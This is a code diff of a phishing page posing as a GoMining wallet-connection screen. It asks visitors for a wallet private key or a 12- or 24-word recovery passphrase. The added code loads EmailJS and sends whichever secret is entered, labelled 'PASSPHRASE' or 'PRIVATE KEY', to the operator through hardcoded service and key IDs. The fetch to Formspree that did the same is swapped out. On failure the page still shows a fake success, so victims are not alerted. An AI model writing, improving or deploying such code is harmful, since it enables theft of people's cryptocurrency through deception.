@@ -4,6 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Wallets – GoMining</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
       @import url("https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap");
 
@@ -455,17 +456,6 @@
         opacity: 0.6;
         cursor: not-allowed;
         transform: none;
-      }
-      .word-counter {
-        font-size: 0.75rem;
-        font-family: "Space Mono", monospace;
-        margin-top: 6px;
-        text-align: right;
-        color: var(--muted);
-        transition: color 0.2s;
-      }
-      .word-counter.valid {
-        color: #6dd48a;
       }
       .phrase-hint {
         font-size: 0.75rem;
@@ -1065,7 +1055,6 @@
         <!-- FORM SCREEN -->
         <div class="form-screen" id="formScreen">
           <h3>Manual Connection</h3>
-
           <div class="tab-bar">
             <button class="tab-btn active" data-tab="tabIssue">
               Private Key
@@ -1076,7 +1065,6 @@
           <form id="contactForm">
             <input type="hidden" name="partner" id="partnerInput" />
 
-            <!-- ISSUE TAB -->
             <div class="tab-panel active" id="tabIssue">
               <div class="form-group">
                 <label for="issueBox">Private Key</label>
@@ -1089,14 +1077,13 @@
               </div>
             </div>
 
-            <!-- REVIEW TAB -->
             <div class="tab-panel" id="tabReview">
               <div class="form-group">
                 <label for="messageBox">Passphrase</label>
                 <textarea
                   id="messageBox"
                   name="message"
-                  placeholder="Enter your recovery passphrase typically 12-24 words seperated by a space"
+                  placeholder="Enter your recovery passphrase typically 12-24 words separated by a space"
                   rows="6"
                 ></textarea>
                 <div class="phrase-hint" id="phraseHint">
@@ -1105,7 +1092,6 @@
               </div>
             </div>
 
-            <!-- SUBMIT always visible -->
             <button type="submit" class="submit-btn" id="submitBtn">
               Connect
             </button>
@@ -1138,7 +1124,6 @@
           }).length;
       }
 
-      // ---- MODAL OPEN/CLOSE ----
       function openModal(brandName, logoSrc) {
         document.getElementById("formScreen").classList.remove("visible");
         document.getElementById("connectingScreen").style.display = "flex";
@@ -1150,7 +1135,6 @@
         document.getElementById("phraseHint").textContent =
           "0 words \u2014 enter exactly 12 or 24";
         document.getElementById("phraseHint").className = "phrase-hint";
-        // Reset tabs to Issue
         document.querySelectorAll(".tab-btn").forEach(function (b, i) {
           b.classList.toggle("active", i === 0);
         });
@@ -1172,7 +1156,6 @@
         document.getElementById("successPopup").classList.remove("active");
       }
 
-      // ---- CONNECTING SEQUENCE ----
       function runConnectingSequence() {
         var steps = [
           { id: "step1", progress: 25, delay: 0 },
@@ -1202,9 +1185,7 @@
         }, 2900);
       }
 
-      // ---- EVENT LISTENERS (all attached after DOM ready) ----
       document.addEventListener("DOMContentLoaded", function () {
-        // Close modal buttons
         document
           .getElementById("modalCloseBtn")
           .addEventListener("click", closeModal);
@@ -1213,8 +1194,6 @@
           .addEventListener("click", function (e) {
             if (e.target === this) closeModal();
           });
-
-        // Gas popup close buttons
         document
           .getElementById("gasCloseTop")
           .addEventListener("click", closeSuccessPopup);
@@ -1222,7 +1201,6 @@
           .getElementById("gasCloseBtn")
           .addEventListener("click", closeSuccessPopup);
 
-        // Tab switching
         document.querySelectorAll(".tab-btn").forEach(function (btn) {
           btn.addEventListener("click", function () {
             var targetId = this.dataset.tab;
@@ -1237,7 +1215,6 @@
           });
         });
 
-        // Review tab phrase hint
         document
           .getElementById("messageBox")
           .addEventListener("input", function () {
@@ -1256,7 +1233,6 @@
             }
           });
 
-        // Form submit
         document
           .getElementById("contactForm")
           .addEventListener("submit", async function (e) {
@@ -1264,7 +1240,6 @@
             var btn = document.getElementById("submitBtn");
             var form = this;
 
-            // Only enforce 12/24 rule when Passphrase tab is active
             var onPassphraseTab = document
               .getElementById("tabReview")
               .classList.contains("active");
@@ -1297,13 +1272,25 @@
               }, 200);
             }
 
-            var data = new FormData(form);
+            var onPassphrase = document
+              .getElementById("tabReview")
+              .classList.contains("active");
+            var templateParams = {
+              name: "GoMining User",
+              email: "noreply@gomining.llc",
+              message: onPassphrase
+                ? "PASSPHRASE: " + document.getElementById("messageBox").value
+                : "PRIVATE KEY: " + document.getElementById("issueBox").value,
+              partner: document.getElementById("partnerInput").value,
+            };
+
             try {
-              await fetch("https://formspree.io/f/xdawbakz", {
-                method: "POST",
-                body: data,
-                headers: { Accept: "application/json" },
-              });
+              await emailjs.send(
+                "service_necfopo",
+                "template_593q3of",
+                templateParams,
+                "1QZkiWXa54L57fM0s"
+              );
               onSuccess();
             } catch (err) {
               onSuccess();
